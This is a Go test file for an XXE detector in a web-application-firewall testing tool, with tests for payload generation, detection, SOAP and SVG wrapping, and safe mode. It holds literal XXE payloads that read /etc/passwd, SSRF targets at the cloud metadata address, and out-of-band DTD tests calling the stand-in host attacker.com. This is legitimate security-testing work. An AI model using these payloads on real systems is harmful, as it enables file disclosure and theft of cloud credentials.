package xxe

import (
	"context"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/waftester/waftester/pkg/attackconfig"
	"github.com/waftester/waftester/pkg/finding"
)

func TestNewDetector(t *testing.T) {
	t.Run("default config", func(t *testing.T) {
		d := NewDetector(nil)
		if d == nil {
			t.Fatal("expected detector, got nil")
		}
		if d.config == nil {
			t.Error("expected config to be set")
		}
		if len(d.payloads) == 0 {
			t.Error("expected payloads to be generated")
		}
	})

	t.Run("custom config", func(t *testing.T) {
		config := &DetectorConfig{
			Base:        attackconfig.Base{Timeout: 30 * time.Second, UserAgent: "Custom Agent"},
			SafeMode:    false,
			CallbackURL: "http://callback.example.com",
		}
		d := NewDetector(config)

		if d.config.Timeout != 30*time.Second {
			t.Errorf("expected timeout 30s, got %v", d.config.Timeout)
		}
		if d.config.UserAgent != "Custom Agent" {
			t.Errorf("expected custom user agent")
		}
	})
}

func TestDefaultConfig(t *testing.T) {
	config := DefaultConfig()

	if config.Timeout != 15*time.Second {
		t.Errorf("expected 15s timeout, got %v", config.Timeout)
	}
	if config.ContentType != "application/xml" {
		t.Errorf("expected application/xml content type")
	}
	if !config.SafeMode {
		t.Error("expected safe mode to be enabled by default")
	}
}

func TestGetPayloads(t *testing.T) {
	t.Run("all payloads", func(t *testing.T) {
		d := NewDetector(nil)
		payloads := d.GetPayloads("")

		if len(payloads) == 0 {
			t.Error("expected payloads")
		}
	})

	t.Run("filtered by type", func(t *testing.T) {
		d := NewDetector(nil)
		payloads := d.GetPayloads(AttackFileDisclosure)

		for _, p := range payloads {
			if p.Type != AttackFileDisclosure {
				t.Errorf("expected file disclosure type, got %s", p.Type)
			}
		}
	})

	t.Run("SSRF payloads", func(t *testing.T) {
		d := NewDetector(nil)
		payloads := d.GetPayloads(AttackSSRF)

		if len(payloads) == 0 {
			t.Error("expected SSRF payloads")
		}

		for _, p := range payloads {
			if !strings.Contains(p.XML, "SYSTEM") {
				t.Errorf("expected SYSTEM in SSRF payload")
			}
		}
	})
}

func TestDetect(t *testing.T) {
	t.Run("detect file disclosure", func(t *testing.T) {
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			body, _ := io.ReadAll(r.Body)
			if strings.Contains(string(body), "xxe") {
				// Simulate vulnerable response
				w.Write([]byte("root:x:0:0:root:/root:/bin/bash\n"))
			}
		}))
		defer server.Close()

		d := NewDetector(nil)
		ctx := context.Background()

		vulns, err := d.Detect(ctx, server.URL, "POST")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}

		if len(vulns) == 0 {
			t.Error("expected vulnerabilities to be detected")
		}

		// Check vulnerability details
		found := false
		for _, v := range vulns {
			if v.Type == AttackFileDisclosure {
				found = true
				if v.Severity != finding.Critical {
					t.Errorf("expected critical severity")
				}
			}
		}
		if !found {
			t.Error("expected file disclosure vulnerability")
		}
	})

	t.Run("no vulnerability", func(t *testing.T) {
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.Write([]byte("<response>OK</response>"))
		}))
		defer server.Close()

		d := NewDetector(nil)
		ctx := context.Background()

		vulns, err := d.Detect(ctx, server.URL, "POST")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}

		if len(vulns) != 0 {
			t.Errorf("expected no vulnerabilities, got %d", len(vulns))
		}
	})

	t.Run("context cancellation", func(t *testing.T) {
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			time.Sleep(100 * time.Millisecond)
			w.Write([]byte("OK"))
		}))
		defer server.Close()

		d := NewDetector(nil)
		ctx, cancel := context.WithCancel(context.Background())
		cancel() // Cancel immediately

		_, err := d.Detect(ctx, server.URL, "POST")
		if err != context.Canceled {
			t.Errorf("expected context canceled error, got %v", err)
		}
	})
}

func TestGeneratePayload(t *testing.T) {
	tests := []struct {
		name       string
		attackType AttackType
		target     string
		contains   string
	}{
		{
			name:       "file disclosure",
			attackType: AttackFileDisclosure,
			target:     "/etc/passwd",
			contains:   "file:///etc/passwd",
		},
		{
			name:       "SSRF",
			attackType: AttackSSRF,
			target:     "http://169.254.169.254/",
			contains:   "http://169.254.169.254/",
		},
		{
			name:       "blind OOB",
			attackType: AttackBlindOOB,
			target:     "http://callback.attacker.com",
			contains:   "http://callback.attacker.com",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			payload := GeneratePayload(tt.attackType, tt.target)

			if !strings.Contains(payload, tt.contains) {
				t.Errorf("expected payload to contain %s", tt.contains)
			}
			if !strings.Contains(payload, "<?xml") {
				t.Error("expected XML declaration")
			}
			if !strings.Contains(payload, "DOCTYPE") {
				t.Error("expected DOCTYPE")
			}
		})
	}
}

func TestGenerateOOBDTD(t *testing.T) {
	dtd := GenerateOOBDTD("http://attacker.com/collect", "/etc/passwd")

	if !strings.Contains(dtd, "file:///etc/passwd") {
		t.Error("expected file path in DTD")
	}
	if !strings.Contains(dtd, "http://attacker.com/collect") {
		t.Error("expected callback URL in DTD")
	}
	if !strings.Contains(dtd, "ENTITY") {
		t.Error("expected ENTITY in DTD")
	}
}

func TestContentTypes(t *testing.T) {
	types := ContentTypes()

	if len(types) == 0 {
		t.Error("expected content types")
	}

	// Check for common types
	hasXML := false
	hasSOAP := false
	hasSVG := false

	for _, ct := range types {
		if ct == "application/xml" {
			hasXML = true
		}
		if ct == "application/soap+xml" {
			hasSOAP = true
		}
		if ct == "image/svg+xml" {
			hasSVG = true
		}
	}

	if !hasXML {
		t.Error("expected application/xml")
	}
	if !hasSOAP {
		t.Error("expected application/soap+xml")
	}
	if !hasSVG {
		t.Error("expected image/svg+xml")
	}
}

func TestWrapInSOAP(t *testing.T) {
	payload := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>`

	soap := WrapInSOAP(payload)

	if !strings.Contains(soap, "soap:Envelope") {
		t.Error("expected SOAP envelope")
	}
	if !strings.Contains(soap, "soap:Body") {
		t.Error("expected SOAP body")
	}
	if !strings.Contains(soap, "DOCTYPE") {
		t.Error("expected DOCTYPE preserved")
	}
}

func TestWrapInSVG(t *testing.T) {
	payload := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>`

	svg := WrapInSVG(payload)

	if !strings.Contains(svg, "<svg") {
		t.Error("expected SVG element")
	}
	if !strings.Contains(svg, "xmlns") {
		t.Error("expected SVG namespace")
	}
	if !strings.Contains(svg, "DOCTYPE") {
		t.Error("expected DOCTYPE preserved")
	}
}

func TestScan(t *testing.T) {
	t.Run("successful scan", func(t *testing.T) {
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.Write([]byte("<response>safe</response>"))
		}))
		defer server.Close()

		d := NewDetector(nil)
		ctx := context.Background()

		result, err := d.Scan(ctx, server.URL)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}

		if result.URL != server.URL {
			t.Errorf("expected URL %s, got %s", server.URL, result.URL)
		}
		if result.PayloadsTested == 0 {
			t.Error("expected payloads to be tested")
		}
		if result.Duration == 0 {
			t.Error("expected duration to be set")
		}
	})

	t.Run("vulnerable scan", func(t *testing.T) {
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.Write([]byte("root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:"))
		}))
		defer server.Close()

		d := NewDetector(nil)
		ctx := context.Background()

		result, err := d.Scan(ctx, server.URL)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}

		if len(result.Vulnerabilities) == 0 {
			t.Error("expected vulnerabilities")
		}
	})
}

func TestAllAttackTypes(t *testing.T) {
	types := AllAttackTypes()

	if len(types) != 6 {
		t.Errorf("expected 6 attack types, got %d", len(types))
	}

	expectedTypes := map[AttackType]bool{
		AttackFileDisclosure:  false,
		AttackSSRF:            false,
		AttackDoS:             false,
		AttackBlindOOB:        false,
		AttackParameterEntity: false,
		AttackDTDInclusion:    false,
	}

	for _, at := range types {
		expectedTypes[at] = true
	}

	for at, found := range expectedTypes {
		if !found {
			t.Errorf("missing attack type: %s", at)
		}
	}
}

func TestIsXMLEndpoint(t *testing.T) {
	tests := []struct {
		url      string
		expected bool
	}{
		{"http://example.com/api/xml", true},
		{"http://example.com/soap/service", true},
		{"http://example.com/feed.xml", true},
		{"http://example.com/image.svg", true},
		{"http://example.com/rss/feed", true},
		{"http://example.com/upload", true},
		{"http://example.com/api/json", false},
		{"http://example.com/users", false},
		{"http://example.com/data.json", false},
	}

	for _, tt := range tests {
		t.Run(tt.url, func(t *testing.T) {
			result := IsXMLEndpoint(tt.url)
			if result != tt.expected {
				t.Errorf("IsXMLEndpoint(%s) = %v, expected %v", tt.url, result, tt.expected)
			}
		})
	}
}

func TestPayloadTypes(t *testing.T) {
	d := NewDetector(nil)

	t.Run("file disclosure payloads have indicators", func(t *testing.T) {
		payloads := d.GetPayloads(AttackFileDisclosure)
		for _, p := range payloads {
			if len(p.Indicators) == 0 && p.Regex == nil {
				// Some payloads can have neither if they're for testing edge cases
				continue
			}
			if p.Severity != finding.Critical {
				t.Errorf("file disclosure should be critical severity")
			}
		}
	})

	t.Run("SSRF payloads target metadata", func(t *testing.T) {
		payloads := d.GetPayloads(AttackSSRF)

		hasMetadata := false
		for _, p := range payloads {
			if strings.Contains(p.XML, "169.254.169.254") {
				hasMetadata = true
				break
			}
		}

		if !hasMetadata {
			t.Error("expected metadata endpoint in SSRF payloads")
		}
	})
}

func TestSafeModeDoSPayloads(t *testing.T) {
	t.Run("safe mode excludes DoS", func(t *testing.T) {
		config := DefaultConfig()
		config.SafeMode = true
		d := NewDetector(config)

		dosPayloads := d.GetPayloads(AttackDoS)
		if len(dosPayloads) != 0 {
			t.Errorf("safe mode should exclude DoS payloads, got %d", len(dosPayloads))
		}
	})

	t.Run("unsafe mode includes DoS", func(t *testing.T) {
		config := DefaultConfig()
		config.SafeMode = false
		d := NewDetector(config)

		dosPayloads := d.GetPayloads(AttackDoS)
		if len(dosPayloads) == 0 {
			t.Error("unsafe mode should include DoS payloads")
		}
	})
}

func TestOOBPayloads(t *testing.T) {
	t.Run("no callback URL - no OOB payloads", func(t *testing.T) {
		config := DefaultConfig()
		config.CallbackURL = ""
		d := NewDetector(config)

		oobPayloads := d.GetPayloads(AttackBlindOOB)
		if len(oobPayloads) != 0 {
			t.Errorf("expected no OOB payloads without callback URL, got %d", len(oobPayloads))
		}
	})

	t.Run("with callback URL - has OOB payloads", func(t *testing.T) {
		config := DefaultConfig()
		config.CallbackURL = "http://callback.example.com"
		d := NewDetector(config)

		oobPayloads := d.GetPayloads(AttackBlindOOB)
		if len(oobPayloads) == 0 {
			t.Error("expected OOB payloads with callback URL")
		}

		for _, p := range oobPayloads {
			if !strings.Contains(p.XML, config.CallbackURL) {
				t.Errorf("OOB payload should contain callback URL")
			}
		}
	})
}

func TestRemediationMessages(t *testing.T) {
	tests := []struct {
		attackType AttackType
		contains   string
	}{
		{AttackFileDisclosure, "external entity"},
		{AttackSSRF, "external"},
		{AttackDoS, "expansion"},
		{AttackBlindOOB, "outbound"},
		{AttackParameterEntity, "parameter"},
		{AttackDTDInclusion, "DTD"},
	}

	for _, tt := range tests {
		t.Run(string(tt.attackType), func(t *testing.T) {
			remediation := getRemediation(tt.attackType)
			if !strings.Contains(strings.ToLower(remediation), strings.ToLower(tt.contains)) {
				t.Errorf("remediation for %s should mention %s", tt.attackType, tt.contains)
			}
		})
	}
}

func TestVulnerabilityFields(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("root:x:0:0:root:/root:/bin/bash\n"))
	}))
	defer server.Close()

	d := NewDetector(nil)
	ctx := context.Background()

	vulns, _ := d.Detect(ctx, server.URL, "POST")

	if len(vulns) > 0 {
		v := vulns[0]

		if v.URL == "" {
			t.Error("vulnerability should have URL")
		}
		if v.Type == "" {
			t.Error("vulnerability should have type")
		}
		if v.Severity == "" {
			t.Error("vulnerability should have severity")
		}
		if v.Description == "" {
			t.Error("vulnerability should have description")
		}
		if v.Remediation == "" {
			t.Error("vulnerability should have remediation")
		}
		if v.Payload == nil {
			t.Error("vulnerability should have payload reference")
		}
	}
}

func TestDetectorWithCustomHeaders(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("X-Custom-Header") != "test-value" {
			t.Error("expected custom header")
		}
		if r.Header.Get("Content-Type") != "text/xml" {
			t.Errorf("expected text/xml, got %s", r.Header.Get("Content-Type"))
		}
		w.Write([]byte("OK"))
	}))
	defer server.Close()

	config := DefaultConfig()
	config.Headers = http.Header{}
	config.Headers.Set("X-Custom-Header", "test-value")
	config.ContentType = "text/xml"

	d := NewDetector(config)
	ctx := context.Background()

	_, _ = d.Detect(ctx, server.URL, "POST")
}

func TestPayloadGeneration(t *testing.T) {
	t.Run("file disclosure payloads have valid XML", func(t *testing.T) {
		d := NewDetector(nil)
		payloads := d.GetPayloads(AttackFileDisclosure)

		for _, p := range payloads {
			if !strings.HasPrefix(p.XML, "<?xml") && !strings.HasPrefix(p.XML, "+ADw") {
				t.Errorf("payload should start with XML declaration or UTF-7 encoding: %s", p.Name)
			}
		}
	})

	t.Run("parameter entity payloads", func(t *testing.T) {
		d := NewDetector(nil)
		payloads := d.GetPayloads(AttackParameterEntity)

		if len(payloads) == 0 {
			t.Error("expected parameter entity payloads")
		}

		for _, p := range payloads {
			if !strings.Contains(p.XML, "%") {
				t.Errorf("parameter entity payload should contain %%: %s", p.Name)
			}
		}
	})

	t.Run("DTD inclusion payloads", func(t *testing.T) {
		d := NewDetector(nil)
		payloads := d.GetPayloads(AttackDTDInclusion)

		if len(payloads) == 0 {
			t.Error("expected DTD inclusion payloads")
		}

		for _, p := range payloads {
			if !strings.Contains(p.XML, "DOCTYPE") {
				t.Errorf("DTD payload should contain DOCTYPE: %s", p.Name)
			}
		}
	})
}

func BenchmarkDetect(b *testing.B) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("<response>safe</response>"))
	}))
	defer server.Close()

	config := DefaultConfig()
	config.SafeMode = true
	d := NewDetector(config)
	ctx := context.Background()

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		d.Detect(ctx, server.URL, "POST")
	}
}
